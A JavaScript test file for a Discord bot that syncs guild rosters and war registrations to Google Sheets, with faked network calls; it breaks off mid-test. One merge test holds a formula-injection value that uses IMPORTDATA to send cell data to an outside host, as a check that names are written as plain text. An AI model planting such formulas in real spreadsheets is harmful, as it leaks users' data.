// Google Sheets feed: client (JWT, retries), gateway (key file, ids, error texts), tab builders / writer, sync (debounce,
// serialization, graceful without key / sheet id), the dashboard setup + sync buttons. No network: fetch and the Sheets
// client are fakes, the key is generated here.
const { describe, it, beforeEach, afterEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { PermissionsBitField, PermissionFlagsBits } = require('discord.js');
const { createFakeSheets } = require('./fakeSheets');
const { vn, oid, sid } = require('./helpers');

// ---------- stubs installed BEFORE the bot modules are required ----------
const guildConfigService = require('../src/services/guildConfigService');
const registrationService = require('../src/services/registrationService');
const warService = require('../src/services/warService');
const linkService = require('../src/services/linkService');
const gameRosterService = require('../src/services/gameRosterService');
let config;
let event;
let regs;
let tkMembers;
let updates;
guildConfigService.getConfig = async (id) => (id === 'other-guild' ? { ...config, sheetId: null } : config);
guildConfigService.getConfigOrDefault = async () => config;
guildConfigService.updateConfig = async (guildId, patch) => {
  updates.push(patch);
  config = { ...config, ...patch };
  return config;
};
registrationService.listRegistrations = async () => regs;
let latest = null;
warService.getCurrentEvent = async () => event;
warService.getLatestEvent = async () => latest;
linkService.loadMembers = async () => tkMembers;
let histWars = [];
warService.listSince = async () => histWars;
gameRosterService.departedOf = async () => ({ ids: new Set(), keys: new Set() });
let rosterDoc = null;
gameRosterService.latest = async () => rosterDoc;
gameRosterService.loadMappings = async () => new Map();
const rosterService = require('../src/services/rosterService');
const attendanceService = require('../src/services/attendanceService');
let historyImpl = async () => ({ wars: [], people: new Map() });
attendanceService.history = (...a) => historyImpl(...a);
const eventService = require('../src/services/eventService');
let eventData = { items: [], any: false };
eventService.listForSheet = async () => eventData;
const refresher = require('../src/bot/refresher');
const redraws = [];
refresher.refreshNow = async (...a) => redraws.push(['war', a[1], a[2]]);
refresher.refreshPanelNow = async (...a) => redraws.push(['panel', a[1]]);
refresher.schedulePanelRefresh = () => {};

const { createGoogleClient, loadKey, SheetsError } = require('../src/services/sheets/googleClient');
const gateway = require('../src/services/sheets/gateway');
const feed = require('../src/services/sheets/feed');
const sheetSync = require('../src/bot/sheetSync');
const { merge, writeManagedTab, deleteTabs, formulaSeparator, fx } = require('../src/services/sheets/managedTab');
const { buildSheet } = feed;
const { clearMemberCache } = require('../src/bot/memberCache');
const { buildSheetView } = require('../src/bot/ui/sheetView');
const adminHandler = require('../src/bot/interactions/admin');

const GUILD = '800000000000000001';
const makeGuild = (extra = {}) => ({ id: GUILD, memberCount: 0, members: { cache: new Map(), async fetch() { return this.cache; } }, ...extra });
const EID = oid(7);
// number of ThanhVien writes = number of finished sync runs
const syncs = (fake) => fake.calls.filter((c) => c[0] === 'valuesBatchUpdate' && c[3] === 'RAW' && c[2][0].range === "'ThanhVien'!A1").length;
const SHEET_ID = '1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789';
const MANAGE = new PermissionsBitField(PermissionFlagsBits.ManageGuild);
const NOBODY = new PermissionsBitField(PermissionFlagsBits.SendMessages);

const { privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
const KEY = { type: 'service_account', client_email: 'bot@proj.iam.gserviceaccount.com', private_key: privateKey.export({ type: 'pkcs8', format: 'pem' }), token_uri: 'https://oauth2.example/token' };
let dir;
let keyFile;

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'll-sheets-'));
  keyFile = path.join(dir, 'google-key.json');
  fs.writeFileSync(keyFile, JSON.stringify(KEY));
  config = { ...guildConfigService.defaultConfig(GUILD), sheetId: SHEET_ID, features: { events: true, leave: true, violations: true, draw: true } }; // the optional tabs follow 🧩 Tính năng
  event = { _id: EID, guildId: GUILD, title: 'Bang chiến T7 20:00 (10/10)', status: 'open', startAt: vn(2026, 10, 10, 20), deadlineAt: vn(2026, 10, 10, 18) };
  regs = [
    { discordId: sid(1), displayName: 'An', className: 'Tố Vấn', status: 'join', createdAt: vn(2026, 10, 7, 9, 5) },
    { discordId: sid(2), displayName: 'Bình', className: '🛡️ Thiết Y', status: 'join', createdAt: vn(2026, 10, 7, 9, 10) },
    { discordId: sid(3), displayName: 'Chi', className: 'Huyết Hà', status: 'absent', createdAt: vn(2026, 10, 7, 9, 15) },
    { discordId: sid(4), displayName: 'Dũng', className: null, status: 'reserve', createdAt: vn(2026, 10, 7, 9, 20) },
  ];
  tkMembers = [];
  histWars = [];
  latest = null;
  rosterDoc = null;
  updates = [];
  redraws.length = 0;
  historyImpl = async () => ({ wars: [], people: new Map() });
  eventData = { items: [], any: false };
  clearMemberCache();
  mock.method(console, 'error', () => {});
  mock.method(console, 'warn', () => {});
});
afterEach(() => {
  gateway.setClient(null);
  gateway.resetAvailability();
  sheetSync.cancelScheduled();
  fs.rmSync(dir, { recursive: true, force: true });
  delete process.env.GOOGLE_KEY_FILE;
  mock.restoreAll();
});

// ---------- the client ----------

describe('googleClient (service account, no network)', () => {
  const res = (status, body, headers = {}) => ({ ok: status >= 200 && status < 300, status, headers: { get: (h) => headers[h.toLowerCase()] ?? null }, json: async () => body });
  const makeFetch = (script) => {
    const calls = [];
    const fn = async (url, init) => {
      calls.push({ url, init });
      return script(url, init, calls.length);
    };
    return { fn, calls };
  };
  const token = (url) => (String(url).startsWith('https://oauth2.example') ? res(200, { access_token: 'tok-1', expires_in: 3600 }) : null);

  it('signs a RS256 JWT for the sheets scope, exchanges it once, then sends Bearer tokens', async () => {
    const { fn, calls } = makeFetch((url) => token(url) || res(200, { properties: { title: 'T' }, sheets: [{ properties: { sheetId: 5, title: 'A', gridProperties: { rowCount: 10, columnCount: 3 } } }] }));
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async () => {} });
    assert.deepEqual(await client.getSpreadsheet('SID'), { title: 'T', locale: '', sheets: [{ sheetId: 5, title: 'A', hidden: false, rowCount: 10, columnCount: 3, tables: [], ruleCount: 0 }] });
    await client.getSpreadsheet('SID');
    const tokenCalls = calls.filter((c) => String(c.url).startsWith('https://oauth2.example'));
    assert.equal(tokenCalls.length, 1, 'token cached');
    const body = new URLSearchParams(tokenCalls[0].init.body);
    assert.equal(body.get('grant_type'), 'urn:ietf:params:oauth:grant-type:jwt-bearer');
    const [h, c, sig] = body.get('assertion').split('.');
    assert.deepEqual(JSON.parse(Buffer.from(h, 'base64url')), { alg: 'RS256', typ: 'JWT' });
    const claims = JSON.parse(Buffer.from(c, 'base64url'));
    assert.equal(claims.iss, KEY.client_email);
    assert.equal(claims.scope, 'https://www.googleapis.com/auth/spreadsheets https://www.googleapis.com/auth/documents');
    assert.equal(claims.aud, KEY.token_uri);
    assert.ok(crypto.createVerify('RSA-SHA256').update(`${h}.${c}`).verify(privateKey, sig, 'base64url'));
    const api = calls.find((x) => String(x.url).startsWith('https://sheets.googleapis.com/'));
    assert.equal(api.init.headers.Authorization, 'Bearer tok-1');
    assert.equal(client.email(), KEY.client_email);
  });

  it('retries 429 / 503 with backoff (honouring Retry-After) and gives up after 3 retries', async () => {
    const sleeps = [];
    let n = 0;
    const { fn } = makeFetch((url) => token(url) || (++n < 3 ? res(n === 1 ? 429 : 503, {}, n === 1 ? { 'retry-after': '2' } : {}) : res(200, { values: [['x']] })));
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async (ms) => sleeps.push(ms) });
    assert.deepEqual(await client.valuesGet('SID', "'A'!A1"), [['x']]);
    assert.deepEqual(sleeps, [2000, 2000]);
    const always = makeFetch((url) => token(url) || res(503, { error: { message: 'down' } }));
    const c2 = createGoogleClient({ keyFile, fetchImpl: always.fn, sleep: async () => {} });
    await assert.rejects(() => c2.batchUpdate('SID', []), (e) => e instanceof SheetsError && e.status === 503 && /down/.test(e.message));
    assert.equal(always.calls.filter((c) => !String(c.url).startsWith('https://oauth2')).length, 4);
  });

  it('403 / 404 are not retried and carry the status; a rejected key says AUTH', async () => {
    const { fn, calls } = makeFetch((url) => token(url) || res(403, { error: { message: 'The caller does not have permission' } }));
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async () => {} });
    await assert.rejects(() => client.getSpreadsheet('SID'), (e) => e.status === 403);
    assert.equal(calls.filter((c) => !String(c.url).startsWith('https://oauth2')).length, 1);
    const bad = createGoogleClient({ keyFile, fetchImpl: async () => res(400, { error: 'invalid_grant', error_description: 'Invalid JWT' }) });
    await assert.rejects(() => bad.getSpreadsheet('SID'), (e) => e.code === 'AUTH' && /invalid_grant/.test(e.message));
  });

  it('missing / malformed key files fail with NO_KEY / BAD_KEY and never leak the content', () => {
    assert.throws(() => loadKey(path.join(dir, 'nope.json')), (e) => e.code === 'NO_KEY');
    const bad = path.join(dir, 'bad.json');
    fs.writeFileSync(bad, '{"private_key":"SECRET-VALUE"}');
    assert.throws(() => loadKey(bad), (e) => e.code === 'BAD_KEY' && !e.message.includes('SECRET-VALUE'));
    fs.writeFileSync(bad, 'not json SECRET-VALUE');
    assert.throws(() => loadKey(bad), (e) => e.code === 'BAD_KEY' && !e.message.includes('SECRET-VALUE'));
  });
});

// ---------- the gateway ----------

describe('gateway', () => {
  it('key file: GOOGLE_KEY_FILE (absolute or relative to the app folder), default <app>/google-key.json', () => {
    const { appRoot } = require('../src/paths');
    delete process.env.GOOGLE_KEY_FILE;
    assert.equal(gateway.keyFile(), path.join(appRoot(), 'google-key.json'));
    assert.equal(gateway.keyFile({ GOOGLE_KEY_FILE: keyFile }), keyFile);
    assert.equal(gateway.keyFile({ GOOGLE_KEY_FILE: 'keys/g.json' }), path.join(appRoot(), 'keys/g.json'));
  });
  it('isAvailable follows the key file; an injected client counts as available', () => {
    process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
    assert.equal(gateway.isAvailable(), false);
    process.env.GOOGLE_KEY_FILE = keyFile;
    assert.equal(gateway.isAvailable(), true);
    assert.equal(gateway.accountEmail(), KEY.client_email);
    process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
    gateway.setClient(createFakeSheets());
    assert.equal(gateway.isAvailable(), true);
  });
  it('parseSpreadsheetId takes a full link, a link with gid, or a bare id; rejects the rest', () => {
    assert.equal(gateway.parseSpreadsheetId(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=12`), SHEET_ID);
    assert.equal(gateway.parseSpreadsheetId(`  ${SHEET_ID} `), SHEET_ID);
    for (const bad of ['', 'abc', 'https://example.com/x', 'bad id with spaces 1234567890']) assert.equal(gateway.parseSpreadsheetId(bad), null, bad);
  });
  it('describeError: 403 / 404 name the service-account e-mail; other errors stay short', () => {
    process.env.GOOGLE_KEY_FILE = keyFile;
    for (const status of [403, 404]) assert.match(gateway.describeError({ status }), /Editor\*\* cho `bot@proj\.iam\.gserviceaccount\.com`/);
    assert.match(gateway.describeError({ code: 'NO_KEY' }), /google-key\.json/);
    assert.match(gateway.describeError({ status: 429 }), /giới hạn/);
    assert.match(gateway.describeError(new Error('x')), /Lỗi Google Sheets: x/);
  });
  it('sheetUrl', () => {
    assert.equal(gateway.sheetUrl('ID'), 'https://docs.google.com/spreadsheets/d/ID/edit');
    assert.equal(gateway.sheetUrl('ID', 7), 'https://docs.google.com/spreadsheets/d/ID/edit#gid=7');
  });
});

// ---------- tab builders / writer ----------

describe('managedTab.merge (what people typed is kept)', () => {
  const header = ['Tên game', 'Phái', 'Discord ID', 'Ghi chú'];
  const keyOf = (get) => String(get('Tên game') || get('Discord ID') || '');
  const spec = { header, keyOf, manual: ['Ghi chú'] };

  it('without the twin (the bot takes the tab over) every cell is the bot\'s except the manual column; other columns are dropped', () => {
    const current = [['Tên game', 'Phái', 'Cũ', 'Ghi chú'], ['An', 'Sai', 'x', 'nhắc nhở']];
    const out = merge({ ...spec, rows: [['An', 'Tố Vấn', sid(1), ''], ['Bình', 'Thiết Y', '', '']], current, before: null });
    assert.deepEqual(out.header, header);
    assert.deepEqual(out.rows, [['An', 'Tố Vấn', sid(1), 'nhắc nhở'], ['Bình', 'Thiết Y', '', '']]);
    assert.deepEqual(out.mirror, [header, ['An', 'Tố Vấn', sid(1), ''], ['Bình', 'Thiết Y', '', '']]);
    assert.equal(out.kept, 0);
  });

  it('a cell somebody changed is kept, an emptied cell goes back to the bot, an untouched cell follows the bot', () => {
    const before = [header, ['An', 'Tố Vấn', sid(1), ''], ['Bình', 'Thiết Y', sid(2), '']];
    const current = [header, ['An', 'Cửu Linh (sửa tay)', sid(1), ''], ['Bình', 'Thiết Y', '', '']];
    const out = merge({ ...spec, rows: [['An', 'Huyết Hà', sid(1), ''], ['Bình', 'Long Ngâm', sid(2), '']], current, before });
    assert.deepEqual(out.rows, [['An', 'Cửu Linh (sửa tay)', sid(1), ''], ['Bình', 'Long Ngâm', sid(2), '']]);
    assert.equal(out.kept, 1);
    assert.deepEqual(out.mirror[1], ['An', 'Huyết Hà', sid(1), ''], 'the twin keeps the bot value, so the edit stays an edit next time');
  });

  it('rows are matched by key after a sort; a formula the sheet renumbered is not an edit; ; or , does not matter', () => {
    const h = ['Tên game', 'Phái'];
    const before = [h, ['An', '=X(A2,1)'], ['Bình', '=X(A3,1)']];
    const current = [h, ['Bình', '=X(A2;1)'], ['An', '=X(A3;1)']]; // sorted by somebody: Sheets moved the references along
    const out = merge({ header: h, keyOf, rows: [['An', fx('=X(A{r},1)')], ['Bình', fx('=X(A{r},1)')]], current, before, sep: ';' });
    assert.deepEqual(out.rows, [['An', fx('=X(A2;1)')], ['Bình', fx('=X(A3;1)')]]);
    assert.equal(out.kept, 0);
  });

  it('only fx() values are formulas: a Discord name starting with "=" is plain text; a formula people typed stays a formula', () => {
    const h = ['Tên game', 'Phái'];
    const evil = '=IMPORTDATA("//x.yz/"&H2)';
    const before = [h, ['An', 'Tố Vấn']];
    const current = [h, ['An', '=UPPER("tay")']];
    const out = merge({ header: h, keyOf, rows: [['An', 'Tố Vấn'], [evil, 'Thiết Y']], current, before });
    assert.deepEqual(out.rows, [['An', fx('=UPPER("tay")')], [evil, 'Thiết Y']]);
    assert.equal(typeof out.rows[1][0], 'string', 'the name is written RAW');
  });

  it('an empty twin (a sync that failed half way) is no twin: nothing old is kept as an edit', () => {
    const current = [header, ['An', 'Cũ', sid(1), ''], ['Rời', 'x', sid(9), '']];
    const out = merge({ ...spec, rows: [['An', 'Mới', sid(1), '']], current, before: [] });
    assert.deepEqual(out.rows, [['An', 'Mới', sid(1), '']]);
    assert.equal(out.taken, true);
  });

  it('a new epoch (another war): edits of the last one do not carry over; the twin remembers the epoch', () => {
    const h = ['Tên game', 'Báo danh'];
    const before = [[...h, '#epoch:w1'], ['An', '⏳ Chưa báo']];
    const current = [h, ['An', '✅ Đi (admin sửa)']];
    const same = merge({ header: h, keyOf, rows: [['An', '⏳ Chưa báo']], current, before, epoch: 'w1' });
    assert.equal(same.rows[0][1], '✅ Đi (admin sửa)');
    const next = merge({ header: h, keyOf, rows: [['An', '⏳ Chưa báo']], current, before, epoch: 'w2' });
    assert.equal(next.rows[0][1], '⏳ Chưa báo');
    assert.deepEqual(next.mirror[0], [...h, '#epoch:w2']);
  });

  it('a column the bot wrote last time and no longer writes (last month\'s war) goes; a header somebody retyped is still the bot\'s column', () => {
    const h1 = ['Tên game', 'T7 03/10', 'Đi'];
    const h2 = ['Tên game', 'T7 07/11', 'Đi'];
    const before = [h1, ['An', '✅ Đi', 1]];
    const current = [['Tên NV', 'T7 03/10', 'Đi'], ['An', '✅ Đi', 1]];
    const out = merge({ header: h2, keyOf, rows: [['An', '', 0]], current, before });
    assert.deepEqual(out.header, h2);
    assert.deepEqual(out.rows, [['An', '', 0]]);
  });

  it('a NEW bot column never swallows a column somebody added at that position (ID game vs "Zalo"); their data stays', () => {
    const old = ['Tên game', 'Phái', 'Ghi chú'];
    const grown = [...old, 'ID game'];
    const before = [old, ['An', 'Tố Vấn', '']];
    const current = [[...old, 'Zalo'], ['An', 'Tố Vấn', '', '0912345678']];
    const out = merge({ header: grown, keyOf, manual: ['Ghi chú'], rows: [['An', 'Tố Vấn', '', '123456']], current, before });
    assert.deepEqual(out.header, [...grown, 'Zalo']);
    assert.deepEqual(out.rows, [['An', 'Tố Vấn', '', '123456', '0912345678']]);
  });

  it('a row whose key somebody cleared is dropped unless it holds something in a column people own', () => {
    const before = [header, ['An', 'Tố Vấn', '', '']];
    const current = [header, ['', 'Tố Vấn', '', ''], ['', '', '', 'ghi chú lẻ']];
    const out = merge({ ...spec, rows: [['An', 'Tố Vấn', '', '']], current, before });
    assert.deepEqual(out.rows, [['An', 'Tố Vấn', '', ''], ['', '', '', 'ghi chú lẻ']]);
  });

  it('rows and columns people added are carried by key; a row the bot no longer writes (left the guild) goes', () => {
    const before = [header, ['An', 'Tố Vấn', sid(1), ''], ['Rời', 'Thiết Y', sid(9), '']];
    const current = [[...header, 'Điểm'], ['Rời', 'Thiết Y', sid(9), '', 5], ['An', 'Tố Vấn', sid(1), '', 9], ['Khách', '', '', 'tự thêm', '']];
    const out = merge({ ...spec, rows: [['An', 'Tố Vấn', sid(1), '']], current, before });
    assert.deepEqual(out.header, [...header, 'Điểm']);
    assert.deepEqual(out.rows, [['An', 'Tố Vấn', sid(1), '', 9], ['Khách', '', '', 'tự thêm', '']]);
  });

  it('formulaSeparator: ; for vi_VN and most of Europe, , for en / ja and an unknown locale', () => {
    assert.deepEqual(['vi_VN', 'de_DE', 'en_US', 'ja_JP', ''].map(formulaSeparator), [';', ';', ',', ',', ',']);
  });
});

describe('managedTab.writeManagedTab', () => {
  const spec = (rows) => ({ title: 'ThanhVien', header: ['Tên game', 'Discord ID', 'Tra'], rows, keyOf: (get) => String(get('Tên game') || ''), frozenColumns: 1, formats: (sheetId) => [{ addConditionalFormatRule: { index: 0, rule: { ranges: [{ sheetId }] } } }] });

  it('creates the tab and its hidden twin; data goes RAW (ids stay text), formulas USER_ENTERED; Table and formats added', async () => {
    const fake = createFakeSheets();
    const out = await writeManagedTab(fake, SHEET_ID, spec([['An', sid(1), fx('=LEN(A{r})')], ['Bình', sid(2), fx('=LEN(A{r})')]]));
    assert.deepEqual([out.created, out.rows, out.kept, out.table], [true, 2, 0, 'added']);
    assert.deepEqual(fake.sheets.get('ThanhVien').rows, [['Tên game', 'Discord ID', 'Tra'], ['An', sid(1), '=LEN(A2)'], ['Bình', sid(2), '=LEN(A3)']]);
    assert.equal(fake.sheets.get('_LL_ThanhVien').hidden, true);
    const writes = fake.calls.filter((c) => c[0] === 'valuesBatchUpdate');
    assert.equal(writes[0][3], 'RAW');
    assert.equal(writes[0][2][0].values[1][2], '', 'no formula in the RAW write');
    assert.equal(writes[1][3], 'USER_ENTERED');
    assert.deepEqual(writes[1][2], [{ range: "'ThanhVien'!C2:C3", values: [['=LEN(A2)'], ['=LEN(A3)']] }]);
    assert.equal(fake.sheets.get('ThanhVien').ruleCount, 1);
  });

  it('a second write keeps the cell somebody edited, refills the rest; the formats are not added again', async () => {
    const fake = createFakeSheets();
    await writeManagedTab(fake, SHEET_ID, spec([['An', sid(1), fx('=LEN(A{r})')]]));
    fake.sheets.get('ThanhVien').rows[1][1] = 'id sửa tay';
    const out = await writeManagedTab(fake, SHEET_ID, spec([['An', sid(3), fx('=LEN(A{r})')], ['Chi', sid(4), fx('=LEN(A{r})')]]));
    assert.deepEqual([out.created, out.kept], [false, 1]);
    assert.deepEqual(fake.sheets.get('ThanhVien').rows.slice(1), [['An', 'id sửa tay', '=LEN(A2)'], ['Chi', sid(4), '=LEN(A3)']]);
    assert.deepEqual(fake.sheets.get('_LL_ThanhVien').rows[1], ['An', sid(3), '=LEN(A2)']);
    assert.equal(fake.sheets.get('ThanhVien').ruleCount, 1);
  });

  it('taking over a tab made earlier (no twin): its old conditional formats are replaced, the lookup is case-insensitive', async () => {
    const fake = createFakeSheets({ tabs: ['thanhvien'] });
    fake.sheets.get('thanhvien').ruleCount = 3;
    const out = await writeManagedTab(fake, SHEET_ID, spec([['An', sid(1), '']]));
    assert.deepEqual([out.created, out.takenOver], [false, true]);
    assert.ok(!fake.sheets.has('ThanhVien'), 'no second tab');
    assert.equal(fake.sheets.get('thanhvien').ruleCount, 1);
  });

  it('deleteTabs deletes only the listed tabs (and their twins)', async () => {
    const fake = createFakeSheets({ tabs: ['LongLinh_DangKy', 'Của admin', 'BangChien'] });
    assert.deepEqual(await deleteTabs(fake, SHEET_ID, feed.OLD_TABS), ['LongLinh_DangKy', 'BangChien']);
    assert.deepEqual([...fake.sheets.keys()], ['Của admin']);
  });
});

describe('feed.buildSheet', () => {
  const info = (n, name, { roles = ['role-m'], names = [], bot = false, joinedAt = vn(2026, 1, 1, 12) } = {}) => ({ id: sid(n), name, bot, roleIds: roles, roleNames: names, joinedAt });
  const an = { name: 'An Game', className: 'Tố Vấn', rank: 'Bang Chúng', daysInGuild: 60, status: 'Online' };
  const moi = { name: 'Người Mới', className: 'Thiết Y', rank: 'Học Việc', daysInGuild: 2, status: '' };
  const war = (n, day) => ({ _id: oid(n), title: `W${n}`, startAt: vn(2026, 10, day, 20), status: 'done' });
  const data = (extra = {}) => ({
    config: { classes: ['Thiết Y', 'Tố Vấn'], memberRoleId: 'role-m', strangerRoleId: null },
    infos: [info(1, 'An Discord'), info(2, 'Bình'), info(3, 'Chi', { names: ['Kẻ Lạ Mặt'] }), info(4, 'Dũng'), info(5, 'Em', { roles: [] }), info(6, 'Bot', { bot: true }), info(7, 'Cũ Rời')],
    roster: [an, moi],
    rosterAt: vn(2026, 10, 20, 12),
    match: { matched: [{ game: an, discordId: sid(1), manual: true, source: 'self' }], uncached: [] },
    dbMembers: [{ discordId: sid(1), missionPref: 'def', tuyenKhien: true }],
    departed: { ids: new Set([sid(4)]), keys: new Set([gameRosterService.nameKey('Cũ Rời')]) },
    ...extra,
  });
  const tab = (tabs, title) => tabs.find((t) => t.title === title);

  it('ThanhVien: characters in the guild (class order), newcomers marked, then members only on Discord; strangers, the departed, non-members and bots never', () => {
    const tabs = buildSheet(data());
    const tv = tab(tabs, feed.MEMBER_TAB);
    assert.deepEqual(tv.header, feed.MEMBER_HEADER);
    assert.deepEqual(tv.rows.map((r) => [r[0], r[5], r[6], r[7], r[8]]), [
      ['Người Mới', 'Mới vào', '', '', ''],
      ['An Game', 'Đang ở bang', 'An Discord', sid(1), 'Tự liên kết'],
      ['', 'Chỉ có Discord', 'Bình', sid(2), 'Chưa liên kết'],
    ]);
    assert.deepEqual(tv.rows[1].slice(9, 12), ['Có', 'Def', 'Có']);
    assert.ok(!JSON.stringify(tv.rows).includes('Lực'), 'no power anywhere');
    assert.deepEqual(tabs.map((t) => t.title), [feed.MEMBER_TAB, feed.WEEK_TAB, feed.HISTORY_TAB], 'no SuKien tab without events');
  });

  it('BangChien_TuanNay: every character with its state and VLOOKUP formulas; registrations of strangers / the departed are left out', () => {
    const regs = [sid(1), sid(2), sid(3), sid(4)].map((discordId, i) => ({ discordId, status: i === 1 ? 'absent' : 'join', className: 'Tố Vấn', createdAt: vn(2026, 10, 21, 9) }));
    const tn = tab(buildSheet(data({ week: { war: war(1, 24), regs } })), feed.WEEK_TAB);
    assert.deepEqual(tn.rows.map((r) => [r[0], r[3], r[7]]), [['Người Mới', '⏳ Chưa báo', ''], ['An Game', '✅ Đi', sid(1)], ['', '❌ Vắng', sid(2)]]);
    assert.deepEqual(tn.rows[1][1], fx('=IFERROR(VLOOKUP($A{r},ThanhVien!$A:$P,7,FALSE),"")'));
    assert.equal(tn.rows[2][1], 'Bình');
  });

  it('BangChien_LichSu: Đi / Không đi / Vắng / Đăng ký nhưng không tham gia (from the result screen) / Chưa vào bang, and the count formula', () => {
    const w1 = war(1, 3);
    const w2 = war(2, 10);
    const attendance = { wars: [{ eventId: String(w1._id) }], people: new Map([[sid(1), { byWar: new Map([[String(w1._id), 'noShow']]) }]]) };
    const history = [
      { war: w1, regs: [{ discordId: sid(1), status: 'join' }] },
      { war: w2, regs: [{ discordId: sid(1), status: 'join' }, { discordId: sid(2), status: 'absent' }, { discordId: sid(3), status: 'join' }] },
    ];
    const ls = tab(buildSheet(data({ history, attendance })), feed.HISTORY_TAB);
    assert.deepEqual(ls.header, [...feed.HISTORY_FIXED, 'T7 03/10', 'T7 10/10', 'Số lần báo đi', 'Discord ID']);
    assert.deepEqual(ls.rows.map((r) => [r[0], r[3], r[4], r[5]]), [
      ['Người Mới', fx('=IFERROR(VLOOKUP($A{r},ThanhVien!$A:$P,6,FALSE),"")'), '🆕 Chưa vào bang', '🆕 Chưa vào bang'],
      ['An Game', fx('=IFERROR(VLOOKUP($A{r},ThanhVien!$A:$P,6,FALSE),"")'), '⚠️ Đăng ký nhưng không tham gia', '✅ Đi'],
      ['', 'Chưa có tên game', '⏳ Không đi', '❌ Vắng'],
    ]);
    assert.deepEqual(ls.rows[1][6], fx('=COUNTIF(E{r}:F{r},"✅*")'));
    assert.ok(!ls.rows.some((r) => r[7] === sid(3)), 'the stranger is not written');
  });

  it('SuKien: answers of members only, game name when linked (Phái looked up), "(chưa ai trả lời)" for an empty event', () => {
    const ev = (n, title) => ({ _id: oid(n), title, status: 'open', startAt: vn(2026, 10, 25, 20) });
    const events = [
      { event: ev(1, 'Tiệc'), replies: [{ discordId: sid(3), status: 'yes' }, { discordId: sid(2), status: 'no' }, { discordId: sid(1), status: 'yes' }] },
      { event: ev(2, 'Trống'), replies: [{ discordId: sid(4), status: 'yes' }] },
    ];
    const sk = tab(buildSheet(data({ events })), feed.EVENT_TAB);
    assert.deepEqual(sk.rows, [
      ['Tiệc', '25/10/2026', 'Đang mở', 'An Game', 'An Discord', fx('=IFERROR(VLOOKUP($D{r},ThanhVien!$A:$P,2,FALSE),"")'), '✅ Tham gia', sid(1)],
      ['Tiệc', '25/10/2026', 'Đang mở', '', 'Bình', '', '❌ Không', sid(2)],
      ['Trống', '25/10/2026', 'Đang mở', '', '', '', '(chưa ai trả lời)', ''],
    ]);
  });
});

describe('sheetSync.syncNow', () => {
  const member = (n, name, roles = []) => ({ id: sid(n), displayName: name, user: { username: `u${n}`, bot: false }, roles: { cache: new Map(roles.map((r) => [r.id, r])) }, joinedAt: vn(2026, 3, 5, 12), guild: { id: GUILD } });
  const guildOf = (list) => ({ id: GUILD, memberCount: list.length, members: { cache: new Map(list.map((m) => [m.id, m])), async fetch() { return this.cache; } } });
  const clientOf = (list) => ({ guilds: { cache: new Map([[GUILD, guildOf(list)]]) } });
  const people = () => [member(1, 'An'), member(2, 'Bình'), member(3, 'Chi', [{ id: 'r-x', name: 'Kẻ lạ mặt' }])];

  it('writes ThanhVien / BangChien_TuanNay / BangChien_LichSu (+ hidden twins), deletes the old tabs, returns the counts', async () => {
    const fake = createFakeSheets({ tabs: ['LongLinh_DangKy', 'LongLinh_DanhBa', 'Của admin'] });
    gateway.setClient(fake);
    rosterDoc = { importedAt: vn(2026, 10, 20, 12), source: 'thanh-vien-bang-2026-10-20.xlsx', members: [{ name: 'An', rank: 'Bang Chúng', className: 'Tố Vấn', daysInGuild: 30, status: '' }] };
    const res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.deepEqual(res, { ok: true, members: 2, week: 2, history: 1, kept: 0 }); // An (auto-matched) + Bình (Discord only); Chi is a stranger
    assert.deepEqual([...fake.sheets.keys()].sort(), ['Của admin', 'ThanhVien', '_LL_ThanhVien', 'BangChien_TuanNay', '_LL_BangChien_TuanNay', 'BangChien_LichSu', '_LL_BangChien_LichSu'].sort());
    const tv = fake.sheets.get('ThanhVien').rows;
    assert.deepEqual(tv[0], feed.MEMBER_HEADER);
    assert.deepEqual(tv.slice(1).map((r) => [r[0], r[6], r[7]]), [['An', 'An', sid(1)], ['', 'Bình', sid(2)]]);
    assert.equal(typeof tv[1][7], 'string');
    assert.deepEqual(fake.sheets.get('BangChien_TuanNay').rows.slice(1).map((r) => r[3]), ['✅ Đi', '✅ Đi']);
  });
  it('ThanhVien: the bot column "ID game" is appended last and the ID is written as a text string (leading zeros, 20 digits)', async () => {
    assert.equal(feed.MEMBER_HEADER.at(-1), 'ID game');
    assert.equal(feed.MEMBER_HEADER.indexOf('Ngày quay lại'), feed.MEMBER_HEADER.length - 2, 'appended: earlier columns keep their place');
    const fake = createFakeSheets();
    gateway.setClient(fake);
    const uid = '00123456789012345678';
    rosterDoc = { importedAt: vn(2026, 10, 20, 12), source: 'x.xlsx', members: [{ name: 'An', rank: 'Bang Chúng', className: 'Tố Vấn', daysInGuild: 30, status: '', gameUid: uid }, { name: 'Bảo', rank: 'Bang Chúng', className: 'Tố Vấn', daysInGuild: 3, status: '' }] };
    await sheetSync.syncNow(clientOf(people()), GUILD);
    const tv = fake.sheets.get('ThanhVien').rows;
    const col = feed.MEMBER_HEADER.indexOf('ID game');
    assert.equal(tv[0][col], 'ID game');
    const row = (name) => tv.find((r) => r[0] === name);
    assert.strictEqual(row('An')[col], uid);
    assert.equal(row('Bảo')[col], '');
    const discordOnly = tv.find((r) => r[0] === '' && r[6] === 'Bình');
    assert.equal(discordOnly.length, feed.MEMBER_HEADER.length, 'every row has the new cell');
    const write = fake.calls.find((c) => c[0] === 'valuesBatchUpdate' && c[2][0].range === "'ThanhVien'!A1");
    assert.equal(write[3], 'RAW', 'RAW keeps a digits string as text');
  });

  it('an incomplete member list writes nothing (people would look unlinked or vanish) and says so', async () => {
    const fake = createFakeSheets();
    gateway.setClient(fake);
    const partial = { guilds: { cache: new Map([[GUILD, makeGuild({ memberCount: 50, members: { cache: new Map(), fetch: async () => { throw new Error('rate limited'); } } })]]) } };
    const res = await sheetSync.syncNow(partial, GUILD);
    assert.equal(res.ok, false);
    assert.match(res.message, /chưa tải đủ danh sách thành viên/);
    assert.equal(fake.calls.length, 0);
  });

  it('what a manager typed survives the next sync', async () => {
    const fake = createFakeSheets();
    gateway.setClient(fake);
